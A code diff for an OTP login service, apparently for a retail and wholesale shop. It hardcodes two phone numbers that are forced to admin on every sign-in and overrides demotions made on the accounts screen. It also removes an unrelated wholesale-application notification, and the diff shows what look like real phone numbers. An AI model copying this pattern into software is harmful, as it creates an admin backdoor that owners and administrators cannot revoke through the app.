@@ -1,9 +1,28 @@
 import { User, type IUser } from '../models/user.model';
-import { Notification } from '../models/notification.model';
 import { ApiError } from '../utils/ApiError';
 import { serializeUser, type SerializedUser } from '../serializers/user.serializer';
 import * as otpService from './otp.service';
 import * as tokenService from './token.service';
+
+/**
+ * Numbers that always hold the admin role, re-applied on every sign-in.
+ *
+ * Keeping the shop's own phones here rather than only in the database means a
+ * fresh deployment — or a restored backup — still has a way in without a manual
+ * database edit, and the role cannot be lost by an accidental change on the
+ * accounts screen.
+ *
+ * Stored in E.164 to match the normalised number `verifyOtpAndLogin` receives.
+ *
+ * Treat this list as a credential: anyone who can receive an OTP on one of
+ * these numbers gets full admin — pricing, every account, every order. Remove a
+ * number the moment the SIM changes hands.
+ */
+const ALWAYS_ADMIN_PHONES: readonly string[] = ['+919363750806', '+919345548984'];
+
+function isAlwaysAdmin(phone: string): boolean {
+  return ALWAYS_ADMIN_PHONES.includes(phone);
+}
 
 export interface LoginContext {
   deviceId?: string;
@@ -47,32 +66,34 @@ export async function verifyOtpAndLogin(input: {
 
   let user = await User.findOne({ phone });
 
+  // A hardcoded admin number is admin no matter what the client asked for.
+  const forcedAdmin = isAlwaysAdmin(phone);
+
   if (!user) {
     user = await User.create({
       phone,
-      accountType,
+      accountType: forcedAdmin ? 'admin' : accountType,
       // A wholesale signup starts pending and stays blocked until an admin
       // approves it — this is what stops retail users self-selecting the
       // discounted tier (PRD 4.1).
-      wholesaleStatus: accountType === 'wholesale' ? 'pending' : 'none',
-      ...(accountType === 'wholesale'
+      wholesaleStatus: !forcedAdmin && accountType === 'wholesale' ? 'pending' : 'none',
+      ...(!forcedAdmin && accountType === 'wholesale'
         ? { business: { ...application, appliedAt: new Date() } }
         : {}),
       lastLoginAt: new Date(),
     });
-
-    if (accountType === 'wholesale') {
-      await Notification.create({
-        userId: user._id,
-        audience: 'user',
-        category: 'wholesale',
-        title: 'Wholesale application received',
-        body: 'Your wholesale account is awaiting admin approval. We will notify you once it is reviewed.',
-      });
-    }
   } else {
     if (!user.isActive) {
       throw ApiError.forbidden('This account has been deactivated. Please contact support.');
+    }
+
+    // Re-applied on every sign-in, so a number added to the list later is
+    // promoted the next time it logs in, and a demotion made by mistake in the
+    // accounts screen cannot lock the shop out. Runs before the wholesale
+    // branch below so `canApply` sees the admin role and leaves it alone.
+    if (forcedAdmin && user.accountType !== 'admin') {
+      user.accountType = 'admin';
+      user.wholesaleStatus = 'none';
     }
 
     // An existing retail customer may apply for wholesale; a rejected applicant
